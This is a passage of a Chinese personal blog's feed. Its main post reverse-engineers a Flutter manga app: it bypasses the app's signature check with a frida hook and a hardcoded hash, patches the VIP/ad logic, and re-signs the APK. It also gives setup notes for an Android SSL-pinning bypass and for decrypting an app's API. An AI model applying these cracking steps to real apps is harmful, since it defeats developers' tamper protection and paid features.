    <content type="html"><![CDATA[<p>之前写代码的模式一直都是vscode编辑，然后wsl2开个terminal编译。因为大多写得都是脚本之类的所以也无伤大雅。但是如果想写一些中大型项目还是有vscode的一些插件支持会好一点，这里记录一下配置过程。</p><p>首先连接到wsl,查看-&gt;命令面板，直接连就可以了</p><p><img src="https://s2.loli.net/2024/07/06/e5qSyHU6XLM1A4V.png" alt="image-20240706150359313"></p><p>然后在扩展里面安装一下插件，主要是rust-analyzer</p><p><img src="https://s2.loli.net/2024/07/06/tJjGPKymMYXVdha.png" alt="image-20240706150553362"></p><p>这里出了一点问题，glibc版本不太对，ubuntu18.04用的glibc没那么新。</p><p>有几个办法:</p><ol><li><p>降低rust-analyzer版本</p></li><li><p>换个高版本的ubuntu连接</p></li><li>手动安装rust-analyzer，然后指定路径(<a href="https://github.com/rust-lang/rust-analyzer/issues/11558">“Bootstrap Error” rust-analyzer requires glibc &gt;= 2.28 in latest build. · Issue #11558 · rust-lang/rust-analyzer (github.com)</a> )</li><li>因为我本地有高版本glibc，直接patchelf应该可行</li></ol><p><img src="https://s2.loli.net/2024/07/06/XyBb1ALwcgYofnW.png" alt="image-20240706150709976"></p><p>这里直接选择换ubuntu20.04连，</p><p><img src="C:\Users\YPJ\AppData\Roaming\Typora\typora-user-images\image-20240706153144048.png" alt="image-20240706153144048"></p><p>换成20.04即可</p><p><strong><img src="https://s2.loli.net/2024/07/06/HeDuQ79wAFmh6En.png" alt="image-20240706153224420"></strong></p><p>然后就能享受一些便捷操作了。<a href="https://rust-analyzer.github.io/manual.html">User Manual (rust-analyzer.github.io)</a> 文档有详细操作。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前写代码的模式一直都是vscode编辑，然后wsl2开个terminal编译。因为大多写得都是脚本之类的所以也无伤大雅。但是如果想写一些中大型项目还是有vscode的一些插件支持会好一点，这里记录一下配置过程。&lt;/p&gt;
&lt;p&gt;首先连接到wsl,查看-&amp;gt;命令面板，直接</summary>
      
    
    
    
    
    <category term="环境" scheme="http://phot0n.com/tags/%E7%8E%AF%E5%A2%83/"/>
    
    <category term="rust" scheme="http://phot0n.com/tags/rust/"/>
    
  </entry>
  
  <entry>
    <title>java动态代理</title>
    <link href="http://phot0n.com/2024/07/04/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/"/>
    <id>http://phot0n.com/2024/07/04/java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/</id>
    <published>2024-07-04T10:32:27.000Z</published>
    <updated>2024-07-05T10:57:03.088Z</updated>
    
    <content type="html"><![CDATA[<p>之前查资料的时候看有提到hook系统接口用到了java动态代理，对这方面也不是很熟，所以乘此机会学习一下</p><h2 id="静态代理"><a href="#静态代理" class="headerlink" title="静态代理"></a>静态代理</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;之前查资料的时候看有提到hook系统接口用到了java动态代理，对这方面也不是很熟，所以乘此机会学习一下&lt;/p&gt;
&lt;h2 id=&quot;静态代理&quot;&gt;&lt;a href=&quot;#静态代理&quot; class=&quot;headerlink&quot; title=&quot;静态代理&quot;&gt;&lt;/a&gt;静态代理&lt;/h2&gt;</summary>
      
    
    
    
    
    <category term="java" scheme="http://phot0n.com/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>flutter逆向初探</title>
    <link href="http://phot0n.com/2024/07/01/flutter%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/"/>
    <id>http://phot0n.com/2024/07/01/flutter%E9%80%86%E5%90%91%E5%88%9D%E6%8E%A2/</id>
    <published>2024-07-01T09:53:27.000Z</published>
    <updated>2024-07-04T09:25:26.485Z</updated>
    
    <content type="html"><![CDATA[<p>最近闲来无事，拾起了之前半学半摆所学的逆向方面内容。也没有系统地学，大部分情况都是为了某个目标（薅资源）所进行的。一直被某个APP的广告所困扰(这玩意的web版我之前逆过,还挺简单的)，而这玩意是用flutter写的，于是就想去分析一下，尝试⛏⛏，顺便熟悉一下flutter逆向。</p><p>在逆的过程中遇到了一些稀奇古怪的问题，代码逻辑倒是不难搞，没有加密混淆反调试之类的，也没有加壳，只有一个签名校验。主要收获还是熟悉了一下整个流程，以及踩了一些坑解决了，所以记录一下。</p><h1 id="flutter介绍"><a href="#flutter介绍" class="headerlink" title="flutter介绍"></a>flutter介绍</h1><p>简单来说，flutter就是一个安卓的软件开发工具包，可以快速在iOS和Android上构建高质量的原生用户界面。其使用Dart语言编写，采用dartVM进行拍摄快照。</p><p>一般我们识别一个APP是否由flutter开发可以通过观察其lib目录是否存在libflutter.so,libapp.so，以及java层是否有flutter字样等</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240702112234343.png" alt="image-20240702112234343"></p><p>关于flutter的原理构成等之后有空再整理。</p><p>在<a href="https://blog.tst.sh/reverse-engineering-flutter-apps-part-1/">Reverse engineering Flutter apps (Part 1) (tst.sh)</a> 以及<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fmrale.ph%2Fdartvm%2F">https://mrale.ph/dartvm/</a> 里介绍得很详细了。之后有空再翻译整理一下(我超，我感觉我说了无数次这句话都🕊了)</p><h1 id="逆向步骤"><a href="#逆向步骤" class="headerlink" title="逆向步骤"></a>逆向步骤</h1><h2 id="静态解析"><a href="#静态解析" class="headerlink" title="静态解析"></a>静态解析</h2><p>一般我们关注libapp.so,将其中的快照数据进行解析，从而获取业务代码信息。主要利用了<code>blutter</code>这个工具(随着DartSdk版本的更新，reflutter和flutter逆向助手已经停止更新)。</p><p>按照<a href="https://github.com/worawit/blutter">worawit/blutter: Flutter Mobile Application Reverse Engineering Tool (github.com)</a> 上的步骤直接安装运行就行。</p><p>在安装过程中会遇到一些问题主要报错是git下载，挂个代理就可以了。</p><p>运行之后可以输出这五个文件</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240702112958432.png" alt="image-20240702112958432"></p><p>在ida中解析libapp.so,运行ida_script/addNames.py可以恢复一部分符号</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240702113130073.png" alt="image-20240702113130073"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><h3 id="使用IDA进行动态调试so文件"><a href="#使用IDA进行动态调试so文件" class="headerlink" title="使用IDA进行动态调试so文件"></a>使用IDA进行动态调试so文件</h3><p>可以使用IDA或者gdb对安卓的native层的so文件进行调试。我之前用gdb调试二进制文件比较多，这里学一下使用IDA进行调试的方法</p><p>首先需要打开应用的debug模式，通常是使用androidkiller在AndroidManifest.xml里面添加android:debuggable=”true”然后重签名。但是这个apk似乎会检测签名，所以这里采用magisk开启</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">magisk resetprop ro.secure 0</span><br><span class="line">magisk resetprop ro.debuggable 1</span><br></pre></td></tr></table></figure><p>找到IDA的dbg server</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240702200308739.png" alt="image-20240702200308739"></p><p>传送到机子上</p><p>添加权限运行</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240702200435968.png" alt="image-20240702200435968"></p><p>下好断点之后选择进程进行attach</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240702210602125.png" alt="image-20240702210602125"></p><p>然后可以成功的attach上，在相应的地方断下来</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240702212910005.png" alt="image-20240702212910005"></p><p>过程中遇到了几个坑，其一是<code>got unknown signal #33</code> ，老会弹警告，很烦。</p><p>解决方法是在<code>debugger options</code>中的<code>edit exceptions</code>弹出的Excepptions界面中直接右键<code>insert</code>一个33号signal的处理，选择啥也不干直接Slient即可</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704141045708.png" alt="image-20240704141045708"></p><p>后面如果也不断地跳signal警告，而该警告我们不关心的话直接slient就行了</p><p>但是事实上逆向的过程并没有怎么使用到IDA的调试，主要是因为不知道为什么调试起来巨慢，前几个step要好久才能响应。主要还是用的frida。</p><h2 id="简要流程"><a href="#简要流程" class="headerlink" title="简要流程"></a>简要流程</h2><p>感觉主要靠猜，既然符号恢复了，那就更能大胆地猜了(bushi)。</p><p>这里先记录一下签名校验的绕过，后记录一下广告的patch(但是实际上做的时候我是先找广告逻辑，之后再改签名校验的)</p><h3 id="签名校验"><a href="#签名校验" class="headerlink" title="签名校验"></a>签名校验</h3><p>当我们修改一些内容，然后重打包自签名安装上的时候，尝试打开app之后我们会发现提示我们408网络异常</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704142745517.png" alt="image-20240704142745517"></p><p>但是明眼人一看就知道这是扯淡，我进去的时候还有开屏广告呢</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704143024547.png" alt="image-20240704143024547"></p><p>所以大概是APP里面作了签名校验，一般校验大概逻辑都是先获取签名信息</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PackageManager pm = context.getPackageManager();</span><br><span class="line">pi = pm.getPackageInfo(context.getPackageName(), PackageManager.GET_SIGNATURES);</span><br><span class="line">Signature[] signatures = pi.signatures;</span><br></pre></td></tr></table></figure><p>所以jadx里面全局搜索一下有没有诸如<code>signature</code>、<code>GET_SIGNATURES</code>、<code>PackageManager</code>等的信息</p><p>确实能搜到</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704143821190.png" alt="image-20240704143821190"></p><p>但是里面并没有发现比较的逻辑，应该是下放到native层进行比较。依次交叉引用可以理出如下逻辑</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704144014611.png" alt="image-20240704144014611"></p><p>这里显然是flutter与java层调用的约定,其调用类似于网络调用。一般来说flutter与java层调用规则如下(详细可参见<a href="https://juejin.cn/post/7055916161132822536">Flutter MethodChannel的使用及原理解析 - 掘金 (juejin.cn)</a> )</p><p>简要来说就是，java端重写<code>configureFlutterEngine</code>方法，在实现上通过<code>MethodChannel</code>方法新建一个<code>methodChannel</code>,利用它的<code>setMethodCallHandler</code>注册一个类似回调函数的东西。</p><p>然后在flutter端通过<code>MethodChannel(&#39;channelName&#39;);</code>指定一个channel，然后利用<code>platform.invokeMethod(&#39;MethodYouCall&#39;)</code>去指定调用某个方法。</p><p>所以我们分析这个m47335b方法，其根据<code>MethodCall</code>的名字指定方法，然后将结果通过<code>Result</code>传回给了flutter端。</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704145330580.png" alt="image-20240704145330580"></p><p>根据交叉引用，我们关注的是这个<code>getUmengString</code>所调用的<code>m47331f</code>,简单的分析不难发现其逻辑就是</p><p>通过signatures获取签名，转换成字节数组，然后利用<code>m47330g</code>给MD5哈希(C2271bz.f3526a=”MD5”，这里获取了一个md5实例)转化成字符串，进而调用链往上将签名的md5结果字符串传给flutter端。</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704145511965.png" alt="image-20240704145511965"></p><p>那很简单，我们直接利用frida把相关函数hook了看看正常发布的app的哈希值是多少，然后在修改版本直接硬编码返回就行了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;INJECT~~~&quot;</span>);</span><br><span class="line">Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;====INTO JAVA====&quot;</span>);</span><br><span class="line">    <span class="keyword">var</span> Activity = Java.use(<span class="string">&#x27;com.copymanga.app.MainActivity&#x27;</span>);</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&quot;SUCCESS????&quot;</span>);</span><br><span class="line">    <span class="comment">// console.log(Mainact.)</span></span><br><span class="line">    Activity.g.implementation = <span class="function"><span class="keyword">function</span>(<span class="params">x</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;obj = &quot;</span>,x);</span><br><span class="line">        <span class="keyword">const</span> ans = <span class="built_in">this</span>.g(x);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&quot;ans = &quot;</span>,ans);</span><br><span class="line">        <span class="keyword">return</span> ans</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>因为一般签名校验是启动阶段执行的，我们选择spawn启动而不是attach</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f com.copymanga.app -l test_java.js</span><br></pre></td></tr></table></figure><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704150746946.png" alt="image-20240704150746946"></p><p>可以hook得到所处理的字符数组以及相应的哈希结果(<code>3af08590311032efe0660550a0563a53</code>) 我们可以直接patch掉这个函数直接返回硬编码哈希结果即可</p><p>我们可以发现一个没用的函数<code>m47334c</code>返回的空字符串，我们借用他完成patch。在<code>getUmengString</code>分支中，调用的函数改成c。</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704163729911.png" alt="image-20240704163729911"></p><p>然后修改c的实现，返回哈希值</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704163809297.png" alt="image-20240704163809297"></p><p>顺便一提，具体完整的验证逻辑，在so层(libapp.so)似乎是MD5(MD5(signature))。</p><h3 id="广告逻辑PATCH"><a href="#广告逻辑PATCH" class="headerlink" title="广告逻辑PATCH"></a>广告逻辑PATCH</h3><p>这里主要深入libapp.so,在使用blutter恢复符号之后，我们可以通过查找关键字符定位到一些关键函数。</p><p>可以发现一些诸如myapp的字样，应该是实现的业务代码，而其他的dart_core应该就是类似库函数的东西，我们不用管</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704165600016.png" alt="image-20240704165600016"></p><p>该APP在用户赞助，有VIP的时候会去除广告，所以我们尝试搜索一些关键字符，可以搜到VIP相关的函数，这个isVip应该就是检测是否是vip的函数</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704165911981.png" alt="image-20240704165911981"></p><p>直接查交叉引用，能找到很多AD相关的函数</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\flutter逆向初探.assets\image-20240704170206933.png" alt="image-20240704170206933"></p><p>依次往上交叉引用可以找到类似开屏初始化的东西，以及homepage的东西。都是业务代码不难看，半逆半猜即可搞定。</p><h2 id="签名与重打包"><a href="#签名与重打包" class="headerlink" title="签名与重打包"></a>签名与重打包</h2><p>patch完打包用<code>apktool b</code>给build上即可。</p><p>修改，打包，签名后的apk在我的测试机(安卓版本为10)上可以正常运行</p><p>对于安卓版本大于等于11(Android &gt;= 11)或者SDK&gt;=30可能会出现如下问题</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Failure [-124: Failed parse during installPackageLI: Targeting R+ (version 30 and above) requires the resources.arsc of installed APKs to be stored uncompressed and aligned on a 4-byte boundary]</span><br></pre></td></tr></table></figure><p>查了一下好像是因为旧版本<code>jarsigner</code>对齐的原因(通过报错就能发现)，github上有人写了工具解决<a href="https://github.com/mathieures/convert-apk/">mathieures/convert-apk: Convert .apk files to install them on Android &gt;= 11 (SDK &gt;= 30) (github.com)</a> ，但是我没跑起来，好像是啥东西没装，我也懒得配环境了。</p><p>用zipalign对齐一下再签名就行了</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">zipalign -p -f -v <span class="number">4</span> out.apk out_unsigned.apk</span><br><span class="line">apksigner sign --ks test.keystore --ks-key-alias testalias --out out_sign.apk out_unsigned.apk</span><br><span class="line">zipalign -c -v <span class="number">4</span> out_unsigned.apk</span><br></pre></td></tr></table></figure><h2 id="后记与思考"><a href="#后记与思考" class="headerlink" title="后记与思考"></a>后记与思考</h2><p>这个app还算比较简单，因为没有加壳反调或是加密之类的一些东西，基本用frida即可搞定，就是libapp.so里面一些代码难看一些，但是有符号还算能搞。</p><p>首先是签名校验，它虽然校验操作是在so层，但是获取签名的逻辑还是比较好判断。假如说开发人员在多处编写校验代码，或者搞上其他一些花活可能就比较难分析。一种好的解决办法是直接hook系统的接口来绕过(比如<code>getPackageInfo</code>等)，再结合动态代理。</p><p>对于该app只是简单的去广告，但是下载次数限制，以及在最近版本新加的内容（花写真币买写真看 ,6)还没有认真去逆。包括如果我们想写爬虫的花，也没有逆它的API接口。在后面可能会继续逆它的逻辑，把app端的api接口逆出来。希望通过这一个apk尝试各种方法把安卓逆向之类的都过一遍。</p><p>这个app还有一个可以玩的点就是它的轻小说界面是不允许截图的，会弹出弹框，并且切屏的时候也会变成黑屏，看不见内容(我之前想在切屏状态截图发现不可行)，可以研究研究。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近闲来无事，拾起了之前半学半摆所学的逆向方面内容。也没有系统地学，大部分情况都是为了某个目标（薅资源）所进行的。一直被某个APP的广告所困扰(这玩意的web版我之前逆过,还挺简单的)，而这玩意是用flutter写的，于是就想去分析一下，尝试⛏⛏，顺便熟悉一下flutter</summary>
      
    
    
    
    
    <category term="逆向" scheme="http://phot0n.com/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Android" scheme="http://phot0n.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>安卓逆向相关配置与入门</title>
    <link href="http://phot0n.com/2023/10/27/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%85%A5%E9%97%A8/"/>
    <id>http://phot0n.com/2023/10/27/%E5%AE%89%E5%8D%93%E9%80%86%E5%90%91%E7%9B%B8%E5%85%B3%E9%85%8D%E7%BD%AE%E4%B8%8E%E5%85%A5%E9%97%A8/</id>
    <published>2023-10-27T02:49:57.000Z</published>
    <updated>2023-10-30T13:48:45.646Z</updated>
    
    <content type="html"><![CDATA[<p>一直想搞安卓逆向去白嫖资源，但是大部分都是断断续续地搞，没啥系统性，想起啥了就学啥，比较没有方向性。年初的时候心血来潮买了个测试机使用，但是好像由于配置过于低了一开frida-server就卡死。正好最近新换了个手机，于是就把之前那个屏幕碎了一角的小米10拿来刷机当测试机了，记录一下学习过程。</p><h1 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h1><h2 id="ROOT"><a href="#ROOT" class="headerlink" title="ROOT"></a>ROOT</h2><p>首先解BL锁，小米手机解这玩意还是比较好搞的，网上都有教程。但是好像限制了新机7天后才能解，一年只能解xx部。不过咱也不是天天解锁，拿一台解了当测试机就行了</p><p>这玩意的教程网上都有，无非就是下载对应版本的刷机包刷机，用Magisk改boot.img镜像然后fastboot刷进分区之类的，这里就不赘述了</p><h2 id="装frida"><a href="#装frida" class="headerlink" title="装frida"></a>装frida</h2><p>主要将frida-server给push到手机上，加上运行权限之后运行(在root下)就可以了，然后就能通过frida的一些命令来看诸如进程之类的信息了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb push frida-server-16.0.10-android-arm64 /data/<span class="built_in">local</span>/tmp</span><br></pre></td></tr></table></figure><h2 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h2><p>主要有这么几种方式:httpcanary、fiddler、tcpdump(这有点原始了感觉)之类的。当然让手机走电脑的代理然后在电脑上拦截包应该也是可行的。之前在测试机上装的是httpcanary，所以也就撞了这玩意</p><p>需要注意的是安卓7以上不再信任用户的CA，想抓https包需要root然后放到系统CA</p><p>这里我参照了这篇文章</p><p><a href="https://www.zqh.plus/2022/03/19/Android-Capture/">Android 7~12 使用HttpCanary抓取HTTPS - 我的学习记录 (zqh.plus)</a></p><p>但是好像刷入Magisk模块之后再httpcanary里面导入还是有点问题，之后我adb到shell里面看了好像不是root的原因，而是/system本身是一个read only的file system，直接重新mount一下设置属性为rw好像还是会出现这样那样的问题。之后虽然能抓HTTPS包，但是会出现证书不受信任等问题，打开某APP也会提示我CA不受信任</p><p>于是乎装上了LSPosed与justtrustme，就可以了，参照这两篇文章</p><p><a href="https://magiskcn.com/lsposed-install">LSPosed 安装教程（LSP框架安装教程） - Magisk中文网 (magiskcn.com)</a></p><p><a href="https://qiedd.com/1532.html">安卓Android抓包并绕过SSL pinning - 企鹅大大的博客 (qiedd.com)</a></p><h2 id="动调"><a href="#动调" class="headerlink" title="动调"></a>动调</h2><h1 id="一些APP的实践"><a href="#一些APP的实践" class="headerlink" title="一些APP的实践"></a>一些APP的实践</h1><h2 id="禁X天堂"><a href="#禁X天堂" class="headerlink" title="禁X天堂"></a>禁X天堂</h2><p>之前搞安卓逆向的时候总是jadx打开然后嗯看，要么就是IDA打开native层so嗯看，有时候能搞明白有时候一头雾水。通过逆这玩意我算是了解了信息收集的一些重要性。先分析APP是用啥框架写的，然后再搜相关的知识了解相应的规则，有的放矢。</p><h3 id="抓包-1"><a href="#抓包-1" class="headerlink" title="抓包"></a>抓包</h3><p>通过httpcanary可以抓到一些有用的包(抛开一些广告之类的)，比如当我们进行搜索的时候可以抓到一个相关的包</p><p>可以看到的是请求的API很简单，就是一个get请求</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030194426314.png" alt="image-20231030194426314"></p><p>可以看到的是json的data字段显然经过了base64编码，而转换之后发现是经过了加密的</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030194446536.png" alt="image-20231030194446536"></p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>通过搜索可以知道这玩意使用了react native，通过网上搜索可以知道这玩意相对来说比较好逆，因为关键逻辑都在<code>index.android.bundle</code>这个文件里面，而这个其实就相当于混淆了之后的JS，所以我们只要能逆出JS逻辑就能查的差不多</p><p>一般对于<code>index.android.bundle</code>中的JSON函数，其都是这样形式的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">__d(</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">g, r, i, a, m, e, d</span>) </span>&#123;</span><br><span class="line">  ...</span><br><span class="line">  &#125;,</span><br><span class="line">  nums,</span><br><span class="line">  [nums1,nums2,...,numsn]</span><br><span class="line">  )</span><br></pre></td></tr></table></figure><p>其中<code>nums</code>其实就是对应这个函数的编号，而后面的<code>[nums1,nums2,...,numsn]</code>则十四该函数可能需要用道德其他函数的编号，在函数体里面通过<code>r(d[n])</code>的方式来取函数进行调用</p><p>我们继续看看API是如何加密的，一般大部分API都是用AES等对称密码进行加密的居多，而且绝大部分不会进行一个密钥交换的过程进行密钥的生成，而是直接将密钥以明文的方式进行存储</p><p>直接搜AES字符，可以找到一些有意思的东西</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030195721105.png" alt="image-20231030195721105"></p><p>这个函数是648号函数，显然这里是通过S作为密钥对获得的L.data进行解密，其实感觉这个函数挺像起分发作用的一个函数的</p><p>往上找引用可以找到一些关键信息，首先是和”18comicAPPContent”进行拼接的<code>h</code></p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030201908321.png" alt="image-20231030201908321"></p><p>显然是一个类似时间戳的东西</p><p>然后就是这个操作函数u了</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030201957836.png" alt="image-20231030201957836"></p><p>引用了数组中第4号，而数组是[1, 440, 649, 2, 650, 654]，所以就是650号函数</p><p>650号函数使用了651,652,653号函数，而这个函数的结构显然很像是哈希函数</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030202149283.png" alt="image-20231030202149283"></p><p>看这些常数，大概率是md5没跑了</p><p><img src="D:\DeskTop\PhotonWork\source\_posts\安卓逆向相关配置与入门.assets\image-20231030202255017.png" alt="image-20231030202255017"></p><p>651号函数，这怎么看怎么像base64编码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line">__d(</span><br><span class="line">  <span class="function"><span class="keyword">function</span> (<span class="params">g, r, i, a, m, e, d</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> t, n;</span><br><span class="line">    (t = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span>),</span><br><span class="line">      (n = &#123;</span><br><span class="line">        rotl: <span class="function"><span class="keyword">function</span> (<span class="params">t, n</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (t &lt;&lt; n) | (t &gt;&gt;&gt; (<span class="number">32</span> - n));</span><br><span class="line">        &#125;,</span><br><span class="line">        rotr: <span class="function"><span class="keyword">function</span> (<span class="params">t, n</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">return</span> (t &lt;&lt; (<span class="number">32</span> - n)) | (t &gt;&gt;&gt; n);</span><br><span class="line">        &#125;,</span><br><span class="line">        endian: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (t.constructor == <span class="built_in">Number</span>)</span><br><span class="line">            <span class="keyword">return</span> (<span class="number">16711935</span> &amp; n.rotl(t, <span class="number">8</span>)) | (<span class="number">4278255360</span> &amp; n.rotl(t, <span class="number">24</span>));</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>; o &lt; t.length; o++) t[o] = n.endian(t[o]);</span><br><span class="line">          <span class="keyword">return</span> t;</span><br><span class="line">        &#125;,</span><br><span class="line">        randomBytes: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = []; t &gt; <span class="number">0</span>; t--) n.push(<span class="built_in">Math</span>.floor(<span class="number">256</span> * <span class="built_in">Math</span>.random()));</span><br><span class="line">          <span class="keyword">return</span> n;</span><br><span class="line">        &#125;,</span><br><span class="line">        bytesToWords: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = [], o = <span class="number">0</span>, u = <span class="number">0</span>; o &lt; t.length; o++, u += <span class="number">8</span>)</span><br><span class="line">            n[u &gt;&gt;&gt; <span class="number">5</span>] |= t[o] &lt;&lt; (<span class="number">24</span> - (u % <span class="number">32</span>));</span><br><span class="line">          <span class="keyword">return</span> n;</span><br><span class="line">        &#125;,</span><br><span class="line">        wordsToBytes: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">for</span> (<span class="keyword">var</span> n = [], o = <span class="number">0</span>; o &lt; <span class="number">32</span> * t.length; o += <span class="number">8</span>)</span><br><span class="line">            n.push((t[o &gt;&gt;&gt; <span class="number">5</span>] &gt;&gt;&gt; (<span class="number">24</span> - (o % <span class="number">32</span>))) &amp; <span class="number">255</span>);</span><br><span class="line">          <span class="keyword">return</span> n;</span><br><span class="line">        &#125;,</span><br><span class="line">        bytesToHex: <span class="function"><span class="keyword">function</span> (<span class="params">t</span>) </span>&#123;</span><br><span class="line">          <span class="keyword">for</span> (<span 